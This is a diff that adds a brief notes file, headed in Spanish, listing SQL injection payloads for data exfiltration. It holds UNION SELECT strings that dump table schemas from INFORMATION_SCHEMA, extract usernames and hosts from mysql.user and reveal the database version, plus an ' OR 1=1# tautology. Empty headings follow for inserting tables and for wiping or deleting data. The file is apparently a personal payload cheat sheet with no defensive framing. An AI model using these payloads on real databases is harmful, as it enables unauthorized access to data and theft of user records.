@@ -1,0 +1,24 @@
+*Exfiltracion de datos*
+Database schemas: 
+' UNION SELECT 1 as id,  table_name as name, 00.00 as salary,  table_schema as position, 10 as age  FROM INFORMATION_SCHEMA.TABLES#
+
+Database users:
+' UNION SELECT 1 as id, User as name, 100.00 as salary, Host as position, 2000 as age FROM mysql.user#
+
+*Informacion de base de datos* 
+Database version:
+' UNION SELECT 'a', @@version, 'dummy', DATABASE(), 'dummy'#
+
+Retrieve information of the table:
+' OR 1=1#
+
+*Inserción de tablas/esquemas*
+
+
+*Blanqueo o borrado de datos de tablas*
+
+
+
+
+
+
